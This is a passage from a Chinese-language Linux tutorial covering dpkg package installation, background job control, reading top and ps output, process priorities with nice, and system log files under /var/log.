介绍</h3><p>在网络上见到以<code>deb</code>形式打包的软件包，就需要使用<code>dpkg</code>命令来安装。</p><p><code>dpkg</code>常用参数介绍：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-i</code></td><td>安装指定 deb 包</td></tr><tr><td><code>-R</code></td><td>后面加上目录名，用于安装该目录下的所有 deb 安装包</td></tr><tr><td><code>-r</code></td><td>remove，移除某个已安装的软件包</td></tr><tr><td><code>-I</code></td><td>显示 <code>deb</code> 包文件的信息</td></tr><tr><td><code>-s</code></td><td>显示已安装软件的信息</td></tr><tr><td><code>-S</code></td><td>搜索已安装的软件包</td></tr><tr><td><code>-L</code></td><td>显示已安装软件包的目录信息</td></tr></tbody></table><h3 id="软件安装-2">软件安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用dpkg安装</span><br>sudo dpkg -I xxx.deb<br></code></pre></td></tr></table></figure><p>如果这个包还额外依赖了一些软件包，这意味着，如果主机目前没有这些被依赖的软件包，直接使用 dpkg 安装可能会存在一些问题，因为<code>dpkg</code>并不能为你解决依赖关系。</p><p>我们将如何解决这个错误呢？这就要用到<code>apt-get</code>了，使用它的<code>-f</code>参数了，修复依赖关系的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get -f install -y<br></code></pre></td></tr></table></figure><h3 id="查看已安装软件包的安装目录">查看已安装软件包的安装目录</h3><p>如果你在纠结到底 linux 将软件安装到了什么地方，那么很幸运你将可以通过<code>dpkg</code>找到答案</p><p>使用<code>dpkg -L</code>查看<code>deb</code>包目录信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dpkg -L emacs24<br></code></pre></td></tr></table></figure><h2 id="二进制文件安装">二进制文件安装</h2><p>对应文件下载下来后将对应的二进制包解压到合适目录，之后将包含可执行的主程序文件的目录添加进<code>PATH</code>环境变量即可。</p><h2 id="进程管理">进程管理</h2><p>并且每个终端或者说 bash 只能管理当前终端中的 job，不能管理其他终端中的 job。比如我当前存在两个 bash 分别为 bash1、bash2，bash1 只能管理其自己里面的 job 并不能管理 bash2 里面的 job</p><p>我们都知道当一个进程在前台运作时我们可以用 <code>ctrl + c</code> 来终止它，但是若是在后台的话就不行了。</p><p>我们可以通过 <code>&amp;</code> 这个符号，让我们的命令在后台中运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ls &amp;<br></code></pre></td></tr></table></figure><img src="https://dn-simplecloud.shiyanlou.com/1135081469036077882" alt="实验楼" style="zoom:50%;" /><p>图中所显示的 <code>[1] 236</code>分别是该 job 的 job number 与该进程的 PID，而最后一行的 Done 表示该命令已经在后台执行完毕。</p><p>我们还可以通过 <code>ctrl + z</code> 使我们的当前工作停止并丢到后台中去</p><img src="https://dn-simplecloud.shiyanlou.com/1135081469036715105" alt="实验楼" style="zoom:50%;" /><p>被停止并放置在后台的工作我们可以使用这个命令来查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">jobs</span><br></code></pre></td></tr></table></figure><img src="https://dn-simplecloud.shiyanlou.com/1135081469037134869" alt="实验楼" style="zoom:50%;" /><p>其中第一列显示的为被放置后台 job 的编号，而第二列的 <code>＋</code> 表示最近(刚刚、最后)被放置后台的 job，同时也表示预设的工作，也就是若是有什么针对后台 job 的操作，首先对预设的 job，<code>-</code> 表示倒数第二（也就是在预设之前的一个）被放置后台的工作，倒数第三个（再之前的）以后都不会有这样的符号修饰，第三列表示它们的状态，而最后一列表示该进程执行的命令。</p><p>我们可以通过这样的一个命令将后台的工作拿到前台来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 后面不加参数提取预设工作，加参数提取指定工作的编号</span><br><span class="hljs-comment"># ubuntu 在 zsh 中需要 %，在 bash 中不需要 %</span><br><span class="hljs-built_in">fg</span> [%jobnumber]<br></code></pre></td></tr></table></figure><img src="https://dn-simplecloud.shiyanlou.com/1135081469037555070" alt="实验楼" style="zoom:50%;" /><img src="https://dn-simplecloud.shiyanlou.com/1135081469037666320" alt="实验楼" style="zoom:50%;" /><p>之前我们通过 <code>ctrl + z</code> 使得工作停止放置在后台，若是我们想让其在后台运作我们就使用这样一个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#与fg类似，加参则指定，不加参则取预设</span><br><span class="hljs-built_in">bg</span> [%jobnumber]<br></code></pre></td></tr></table></figure><img src="https://dn-simplecloud.shiyanlou.com/1135081469037983282" alt="实验楼" style="zoom:50%;" /><p>既然有方法将被放置在后台的工作提至前台或者让它从停止变成继续运行在后台，当然也有方法删除一个工作，或者重启等等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kill的使用格式如下</span><br><span class="hljs-built_in">kill</span> -signal %jobnumber<br><br><span class="hljs-comment"># signal从1-64个信号值可以选择，可以这样查看</span><br><span class="hljs-built_in">kill</span> －l<br></code></pre></td></tr></table></figure><p>其中常用的有这些信号值</p><table><thead><tr><th>信号值</th><th>作用</th></tr></thead><tbody><tr><td>-1</td><td>重新读取参数运行，类似与 restart</td></tr><tr><td>-2</td><td>如同 ctrl+c 的操作退出</td></tr><tr><td>-9</td><td>强制终止该任务</td></tr><tr><td>-15</td><td>正常的方式终止该任务</td></tr></tbody></table><img src="https://dn-simplecloud.shiyanlou.com/1135081469038840624" alt="实验楼" style="zoom:50%;" /><blockquote><p>若是在使用 kill ＋信号值然后直接加 pid，你将会对 pid 对应的进程进行操作。<br>若是在使用 kill+信号值然后 <code>％jobnumber</code>，这时所操作的对象是 job，这个数字就是就当前 bash 中后台的运行的 job 的 ID。</p></blockquote><h3 id="进程的查看">进程的查看</h3><p>Linux下可以使用<code>top</code>来实时的查看进程状态，以及一些系统信息，于此也可以通过<code>ps</code>静态查看当前的进程信息，同时我们还可以使用 <code>pstree</code> 来查看当前活跃进程的树形结构。</p><p>top 是一个在前台执行的程序，所以执行后便进入到这样的一个交互界面，正是因为交互界面我们才可以实时的获取到系统与进程的信息。在交互界面中我们可以通过一些指令来操作和筛选。在此之前我们先来了解显示了哪些信息。</p><p>我们看到 top 显示的第一排，</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td>top</td><td>表示当前程序的名称</td></tr><tr><td>11:05:18</td><td>表示当前的系统的时间</td></tr><tr><td>up 8 days,17:12</td><td>表示该机器已经启动了多长时间</td></tr><tr><td>1 user</td><td>表示当前系统中只有一个用户</td></tr><tr><td>load average: 0.29,0.20,0.25</td><td>分别对应 1、5、15 分钟内 cpu 的平均负载</td></tr></tbody></table><p>load average 在 wikipedia 中的解释是 the system load is a measure of the amount of work that a computer system is doing 也就是对当前 CPU 工作量的度量，具体来说也就是指运行队列的平均长度，也就是等待 CPU 的平均进程数相关的一个计算值。</p><p>我们该如何看待这个 load average 数据呢？</p><p>假设我们的系统是单 CPU、单内核的，把它比喻成是一条单向的桥，把 CPU 任务比作汽车。</p><ul><li>load = 0 的时候意味着这个桥上并没有车，cpu 没有任何任务；</li><li>load &lt; 1 的时候意味着桥上的车并不多，一切都还是很流畅的，cpu 的任务并不多，资源还很充足；</li><li>load = 1 的时候就意味着桥已经被车给占满了，没有一点空隙，cpu 已经在全力工作了，所有的资源都被用完了，当然还好，这还在能力范围之内，只是有点慢而已；</li><li>load &gt; 1 的时候就意味着不仅仅是桥上已经被车占满了，就连桥外都被占满了，cpu 已经在全力工作，系统资源的用完了，但是还是有大量的进程在请求，在等待。若是这个值大于 2 表示进程请求超过 CPU 工作能力的 2 倍。而若是这个值大于 5 说明系统已经在超负荷运作了。</li></ul><p>这是单个 CPU 单核的情况，而实际生活中我们需要将得到的这个值除以我们的核数来看。我们可以通过以下的命令来查看 CPU 的个数与核心数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看物理 CPU 的个数</span><br>cat /proc/cpuinfo | grep <span class="hljs-string">&quot;physical id&quot;</span> | sort | uniq |wc -l<br><br><span class="hljs-comment">#每个 cpu 的核心数</span><br>cat /proc/cpuinfo | grep <span class="hljs-string">&quot;physical id&quot;</span> | grep <span class="hljs-string">&quot;0&quot;</span> | wc -l<br></code></pre></td></tr></table></figure><p>通过上面的指数我们可以得知 load 的临界值为 1 ，但是在实际生活中，比较有经验的运维或者系统管理员会将临界值定为 0.7。这里的指数都是除以核心数以后的值，不要混淆了</p><ul><li>若是 load &lt; 0.7 并不会去关注他；</li><li>若是 0.7&lt; load &lt; 1 的时候我们就需要稍微关注一下了，虽然还可以应付但是这个值已经离临界不远了；</li><li>若是 load = 1 的时候我们就需要警惕了，因为这个时候已经没有更多的资源的了，已经在全力以赴了；</li><li>若是 load &gt; 5 的时候系统已经快不行了，这个时候你需要加班解决问题了</li></ul><p>通常我们都会先看 15 分钟的值来看这个大体的趋势，然后再看 5 分钟的值对比来看是否有下降的趋势。</p><p>查看 busybox 的代码可以知道，数据是每 5 秒钟就检查一次活跃的进程数，然后计算出该值，然后 load 从 <code>/proc/loadavg</code> 中读取的。而这个 load 的值是如何计算的呢，这是 load 的计算的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FSHIFT      11          <span class="hljs-comment">/* nr of bits of precision */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FIXED_1     (1&lt;&lt;FSHIFT) <span class="hljs-comment">/* 1.0 as fixed-point(定点) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOAD_FREQ   (5*HZ)      <span class="hljs-comment">/* 5 sec intervals，每隔5秒计算一次平均负载值 */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CALC_LOAD(load, exp, n)     \</span><br><span class="hljs-meta">         load *= exp;               \</span><br><span class="hljs-meta">         load += n*(FIXED_1 - exp); \</span><br><span class="hljs-meta">         load &gt;&gt;= FSHIFT;</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> avenrun[<span class="hljs-number">3</span>];<br><br>EXPORT_SYMBOL(avenrun);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* calc_load - given tick count, update the avenrun load estimates.</span><br><span class="hljs-comment">* This is called while holding a write_lock on xtime_lock.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">calc_load</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> ticks)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> active_tasks; <span class="hljs-comment">/* fixed-point */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> count = LOAD_FREQ;<br>        count -= ticks;<br>        <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">0</span>) &#123;<br>                count += LOAD_FREQ;<br>                active_tasks = count_active_tasks();<br>                CALC_LOAD(avenrun[<span class="hljs-number">0</span>], EXP_1, active_tasks);<br>                CALC_LOAD(avenrun[<span class="hljs-number">1</span>], EXP_5, active_tasks);<br>                CALC_LOAD(avenrun[<span class="hljs-number">2</span>], EXP_15, active_tasks);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>有兴趣的朋友可以研究一下，是如何计算的。代码中的后面这部分相当于它的计算公式。</p></blockquote><p>我们回归正题，来看 top 的第二行数据，基本上第二行是进程的一个情况统计：</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td>Tasks: 26 total</td><td>进程总数</td></tr><tr><td>1 running</td><td>1 个正在运行的进程数</td></tr><tr><td>25 sleeping</td><td>25 个睡眠的进程数</td></tr><tr><td>0 stopped</td><td>没有停止的进程数</td></tr><tr><td>0 zombie</td><td>没有僵尸进程数</td></tr></tbody></table><p>来看 top 的第三行数据，这一行基本上是 CPU 的一个使用情况的统计了：</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td><code>Cpu(s): 1.0%us</code></td><td>用户空间进程占用 CPU 百分比</td></tr><tr><td><code>1.0% sy</code></td><td>内核空间运行占用 CPU 百分比</td></tr><tr><td><code>0.0%ni</code></td><td>用户进程空间内改变过优先级的进程占用 CPU 百分比</td></tr><tr><td><code>97.9%id</code></td><td>空闲 CPU 百分比</td></tr><tr><td><code>0.0%wa</code></td><td>等待输入输出的 CPU 时间百分比</td></tr><tr><td><code>0.1%hi</code></td><td>硬中断(Hardware IRQ)占用 CPU 的百分比</td></tr><tr><td><code>0.0%si</code></td><td>软中断(Software IRQ)占用 CPU 的百分比</td></tr><tr><td><code>0.0%st</code></td><td>(Steal time) 是 hypervisor 等虚拟服务中，虚拟 CPU 等待实际 CPU 的时间的百分比</td></tr></tbody></table><p>CPU 利用率是对一个时间段内 CPU 使用状况的统计，通过这个指标可以看出在某一个时间段内 CPU 被占用的情况，而 Load Average 是 CPU 的 Load，它所包含的信息不是 CPU 的使用率状况，而是在一段时间内 CPU 正在处理以及等待 CPU 处理的进程数情况统计信息，这两个指标并不一样。</p><p>来看 top 的第四行数据，这一行基本上是内存的一个使用情况的统计了：</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td>8176740 total</td><td>物理内存总量</td></tr><tr><td>8032104 used</td><td>使用的物理内存总量</td></tr><tr><td>144636 free</td><td>空闲内存总量</td></tr><tr><td>313088 buffers</td><td>用作内核缓存的内存量</td></tr></tbody></table><p><strong>注意：</strong></p><blockquote><p>系统中可用的物理内存最大值并不是 free 这个单一的值，而是 free + buffers + swap 中的 cached 的和。</p></blockquote><p>来看 top 的第五行数据，这一行基本上是交换区的一个使用情况的统计了：</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td>total</td><td>交换区总量</td></tr><tr><td>used</td><td>使用的交换区总量</td></tr><tr><td>free</td><td>空闲交换区总量</td></tr><tr><td>cached</td><td>缓冲的交换区总量，内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖</td></tr></tbody></table><p>再下面就是进程的一个情况了</p><table><thead><tr><th>列名</th><th>解释</th></tr></thead><tbody><tr><td>PID</td><td>进程 id</td></tr><tr><td>USER</td><td>该进程的所属用户</td></tr><tr><td>PR</td><td>该进程执行的优先级 priority 值</td></tr><tr><td>NI</td><td>该进程的 nice 值</td></tr><tr><td>VIRT</td><td>该进程任务所使用的虚拟内存的总数</td></tr><tr><td>RES</td><td>该进程所使用的物理内存数，也称之为驻留内存数</td></tr><tr><td>SHR</td><td>该进程共享内存的大小</td></tr><tr><td>S</td><td>该进程进程的状态: S=sleep R=running Z=zombie</td></tr><tr><td>%CPU</td><td>该进程 CPU 的利用率</td></tr><tr><td>%MEM</td><td>该进程内存的利用率</td></tr><tr><td>TIME+</td><td>该进程活跃的总时间</td></tr><tr><td>COMMAND</td><td>该进程运行的名字</td></tr></tbody></table><p><strong>注意:</strong></p><p><strong>NICE 值</strong>叫做静态优先级，是用户空间的一个优先级值，其取值范围是 -20 至 19。这个值越小，表示进程”优先级”越高，而值越大“优先级”越低。nice 值中的 -20 到 19，中 -20 优先级最高， 0 是默认的值，而 19 优先级最低。</p><p><strong>PR 值</strong>表示 Priority 值叫动态优先级，是进程在内核中实际的优先级值，进程优先级的取值范围是通过一个宏定义的，这个宏的名称是 <code>MAX_PRIO</code>，它的值为 140。Linux 实际上实现了 140 个优先级范围，取值范围是从 <code>0-139</code>，这个值越小，优先级越高。而这其中的 <code>0-99</code> 是实时进程的值，而 <code>100-139</code> 是给用户的。</p><p>其中 PR 中的 <code>100 to 139</code> 值部分有这么一个对应 <code>PR = 20 + (-20 to +19)</code>，这里的 <code>-20 to +19</code> 便是 nice 值，所以说两个虽然都是优先级，而且有千丝万缕的关系，但是他们的值，他们的作用范围并不相同。</p><p><strong>VIRT</strong> 任务所使用的虚拟内存的总数，其中包含所有的代码，数据，共享库和被换出 swap 空间的页面等所占据空间的总数。</p><p>在上文我们曾经说过 top 是一个前台程序，所以是一个可以交互的：</p><table><thead><tr><th style="text-align:center">常用交互命令</th><th>解释</th></tr></thead><tbody><tr><td style="text-align:center">q</td><td>退出程序</td></tr><tr><td style="text-align:center">I</td><td>切换显示平均负载和启动时间的信息</td></tr><tr><td style="text-align:center">P</td><td>根据 CPU 使用百分比大小进行排序</td></tr><tr><td style="text-align:center">M</td><td>根据驻留内存大小进行排序</td></tr><tr><td style="text-align:center">i</td><td>忽略闲置和僵死的进程，这是一个开关式命令</td></tr><tr><td style="text-align:center">k</td><td>终止一个进程，系统提示输入 PID 及发送的信号值。一般终止进程用 15 信号，不能正常结束则使用 9 信号。安全模式下该命令被屏蔽。</td></tr></tbody></table><p>好好的利用 top 能够很有效的帮助我们观察到系统的瓶颈所在，或者是系统的问题所在。</p><h3 id="ps的使用">ps的使用</h3><p>我们来总体了解下会出现哪些信息给我们，这些信息又代表着什么（更多的 keywords 大家可以通过 <code>man ps</code> 了解）。</p><table><thead><tr><th>内容</th><th>解释</th></tr></thead><tbody><tr><td><code>F</code></td><td>进程的标志（process flags），当 flags 值为 1 则表示此子程序只是 fork 但没有执行 exec，为 4 表示此程序使用超级管理员 root 权限</td></tr><tr><td><code>USER</code></td><td>进程的拥有用户</td></tr><tr><td><code>PID</code></td><td>进程的 ID</td></tr><tr><td><code>PPID</code></td><td>其父进程的 PID</td></tr><tr><td><code>SID</code></td><td>session 的 ID</td></tr><tr><td><code>TPGID</code></td><td>前台进程组的 ID</td></tr><tr><td><code>%CPU</code></td><td>进程占用的 CPU 百分比</td></tr><tr><td><code>%MEM</code></td><td>占用内存的百分比</td></tr><tr><td><code>NI</code></td><td>进程的 NICE 值</td></tr><tr><td><code>VSZ</code></td><td>进程使用虚拟内存大小</td></tr><tr><td><code>RSS</code></td><td>驻留内存中页的大小</td></tr><tr><td><code>TTY</code></td><td>终端 ID</td></tr><tr><td><code>S or STAT</code></td><td>进程状态</td></tr><tr><td><code>WCHAN</code></td><td>正在等待的进程资源</td></tr><tr><td><code>START</code></td><td>启动进程的时间</td></tr><tr><td><code>TIME</code></td><td>进程消耗 CPU 的时间</td></tr><tr><td><code>COMMAND</code></td><td>命令的名称和参数</td></tr></tbody></table><blockquote><p><strong>TPGID</strong>栏写着-1 的都是没有控制终端的进程，也就是守护进程</p></blockquote><blockquote><p><strong>STAT</strong>表示进程的状态，而进程的状态有很多，如下表所示</p></blockquote><table><thead><tr><th>状态</th><th>解释</th></tr></thead><tbody><tr><td><code>R</code></td><td>Running.运行中</td></tr><tr><td><code>S</code></td><td>Interruptible Sleep.等待调用</td></tr><tr><td><code>D</code></td><td>Uninterruptible Sleep.不可中断睡眠</td></tr><tr><td><code>T</code></td><td>Stoped.暂停或者跟踪状态</td></tr><tr><td><code>X</code></td><td>Dead.即将被撤销</td></tr><tr><td><code>Z</code></td><td>Zombie.僵尸进程</td></tr><tr><td><code>W</code></td><td>Paging.内存交换</td></tr><tr><td><code>N</code></td><td>优先级低的进程</td></tr><tr><td><code>&lt;</code></td><td>优先级高的进程</td></tr><tr><td><code>s</code></td><td>进程的领导者</td></tr><tr><td><code>L</code></td><td>锁定状态</td></tr><tr><td><code>l</code></td><td>多线程状态</td></tr><tr><td><code>+</code></td><td>前台进程</td></tr></tbody></table><blockquote><p>其中的 D 是不能被中断睡眠的状态，处在这种状态的进程不接受外来的任何 signal，所以无法使用 kill 命令杀掉处于 D 状态的进程，无论是 <code>kill</code>，<code>kill -9</code> 还是 <code>kill -15</code>，一般处于这种状态可能是进程 I/O 的时候出问题了。</p></blockquote><p>ps 工具有许多的参数，下面给大家解释部分常用的参数。</p><p>使用 <code>-l</code> 参数可以显示自己这次登录的 bash 相关的进程信息罗列出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -l<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469088103140" alt="实验楼"></p><p>相对来说我们更加常用下面这个命令，他将会罗列出所有的进程信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469089342412" alt="实验楼"></p><p>若是查找其中的某个进程的话，我们还可以配合着 <code>grep</code> 和正则表达式一起使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep zsh<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469089837027" alt="实验楼"></p><p>此外我们还可以查看时，将连同部分的进程呈树状显示出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps axjf<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469090040956" alt="实验楼"></p><p>当然如果你觉得使用这样的此时没有把你想要的信息放在一起，我们也可以是用这样的命令，来自定义我们所需要的参数显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -afxo user,ppid,pid,pgid,<span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469004994601" alt="实验楼"></p><p>这是一个简单而又实用的工具，想要更灵活的使用，想要知道更多的参数我们可以使用 man 来获取更多相关的信息。</p><h3 id="pstree的使用">pstree的使用</h3><p>通过 <code>pstree</code> 可以很直接的看到相同的进程数量，最主要的还是我们可以看到所有进程之间的相关性。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pstree<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469090893467" alt="实验楼"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pstree -up<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数选择</th><th>解释</th></tr></thead><tbody><tr><td>-A</td><td>程序树之间以 ASCII 字符连接</td></tr><tr><td>-p</td><td>同时列出每个 process 的 PID</td></tr><tr><td>-u</td><td>同时列出每个 process 的所属账户名称</td></tr></tbody></table><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469091089249" alt="实验楼"></p><h3 id="kill指令的使用">kill指令的使用</h3><p>我们来回顾一下，当一个进程结束的时候或者要异常结束的时候，会向其父进程返回一个或者接收一个 SIGHUP 信号而做出的结束进程或者其他的操作，这个 SIGHUP 信号不仅可以由系统发送，我们可以使用 <code>kill</code> 来发送这个信号来操作进程的结束或者重启等等。</p><p>上节课程我们使用 <code>kill</code> 命令来管理我们的一些 job，这节课我们将尝试用 <code>kill</code> 来操作下一些不属于 job 范畴的进程，直接对 pid 下手。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 首先我们使用图形界面打开了 gedit、gvim，用 ps 可以查看到</span><br>ps aux<br><br><span class="hljs-comment"># 使用 9 这个信号强制结束 gedit 进程</span><br><span class="hljs-built_in">kill</span> -9 1608<br><br><span class="hljs-comment"># 我们再查找这个进程的时候就找不到了</span><br>ps aux | grep gedit<br></code></pre></td></tr></table></figure><h3 id="进程执行顺序">进程执行顺序</h3><p>我们在使用 ps 命令的时候可以看到大部分的进程都是处于休眠的状态，如果这些进程都被唤醒，那么该谁最先享受 CPU 的服务，后面的进程又该是一个什么样的顺序呢？进程调度的队列又该如何去排列呢？</p><p>当然就是靠该进程的优先级值来判定进程调度的优先级，而优先级的值就是上文所提到的 PR 与 nice 来控制与体现了</p><p>而 nice 的值我们是可以通过 nice 命令来修改的，而需要注意的是 nice 值可以调整的范围是 <code>-20 ~ 19</code>，其中 root 有着至高无上的权力，既可以调整自己的进程也可以调整其他用户的程序，并且是所有的值都可以用，而普通用户只可以调制属于自己的进程，并且其使用的范围只能是 <code>0 ~ 19</code>，因为系统为了避免一般用户抢占系统资源而设置的一个限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这个实验在环境中无法做，因为权限不够，可以自己在本地尝试</span><br><br><span class="hljs-comment"># 打开一个程序放在后台，或者用图形界面打开</span><br>nice -n -5 vim &amp;<br><br><span class="hljs-comment"># 用 ps 查看其优先级</span><br>ps -afxo user,ppid,pid,<span class="hljs-built_in">stat</span>,pri,ni,time,<span class="hljs-built_in">command</span> | grep vim<br></code></pre></td></tr></table></figure><p>我们还可以用 renice 来修改已经存在的进程的优先级，同样因为权限的原因在实验环境中无法尝试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">renice -5 pid<br></code></pre></td></tr></table></figure><h2 id="日志系统">日志系统</h2><p>日志是一个系统管理员，一个运维人员，甚至是开发人员不可或缺的东西，系统用久了偶尔也会出现一些错误，我们需要日志来给系统排错，在一些网络应用服务不能正常工作的时候，我们需要用日志来做问题定位，日志还是过往时间的记录本，我们可以通过它知道我们是否被不明用户登录过等等。</p><p>在 Linux 中大部分的发行版都内置使用 syslog 系统日志，那么通过前期的课程我们了解到常见的日志一般存放在 <code>/var/log</code> 中，我们来看看其中有哪些日志</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469406921904" alt="实验楼"></p><p>根据图中所显示的日志，我们可以根据服务对象粗略的将日志分为两类</p><ul><li>系统日志</li><li>应用日志</li></ul><p>系统日志主要是存放系统内置程序或系统内核之类的日志信息如 <code>alternatives.log</code> 、<code>btmp</code> 等等，应用日志主要是我们装的第三方应用所产生的日志如 <code>tomcat7</code> 、<code>apache2</code> 等等。</p><p>接下来我们来看看常见的系统日志有哪些，他们都记录了怎样的信息</p><table><thead><tr><th>日志名称</th><th>记录信息</th></tr></thead><tbody><tr><td>alternatives.log</td><td>系统的一些更新替代信息记录</td></tr><tr><td>apport.log</td><td>应用程序崩溃信息记录</td></tr><tr><td>apt/history.log</td><td>使用 apt-get 安装卸载软件的信息记录</td></tr><tr><td>apt/term.log</td><td>使用 apt-get 时的具体操作，如 package 的下载、打开等</td></tr><tr><td>auth.log</td><td>登录认证的信息记录</td></tr><tr><td>boot.log</td><td>系统启动时的程序服务的日志信息</td></tr><tr><td>btmp</td><td>错误的信息记录</td></tr><tr><td>Consolekit/history</td><td>控制台的信息记录</td></tr><tr><td>dist-upgrade</td><td>dist-upgrade 这种更新方式的信息记录</td></tr><tr><td>dmesg</td><td>启动时，显示屏幕上内核缓冲信息，与硬件有关的信息</td></tr><tr><td>dpkg.log</td><td>dpkg 命令管理包的日志。</td></tr><tr><td>faillog</td><td>用户登录失败详细信息记录</td></tr><tr><td>fontconfig.log</td><td>与字体配置有关的信息记录</td></tr><tr><td>kern.log</td><td>内核产生的信息记录，在自己修改内核时有很大帮助</td></tr><tr><td>lastlog</td><td>用户的最近信息记录</td></tr><tr><td>wtmp</td><td>登录信息的记录。wtmp 可以找出谁正在进入系统，谁使用命令显示这个文件或信息等</td></tr><tr><td>syslog</td><td>系统信息记录</td></tr></tbody></table><p>而在本实验环境中没有 apport.log 是因为 apport 这个应用程序需要读取一些内核的信息来收集判断其他应用程序的信息，从而记录应用程序的崩溃信息。而在本实验环境中我们没有这个权限，所以将 apport 从内置应用值剔除，自然而然就没有它的日志信息了。</p><p>只闻其名，不见其人，我们并不能明白这些日志记录的内容。首先我们来看 <code>alternatives.log</code> 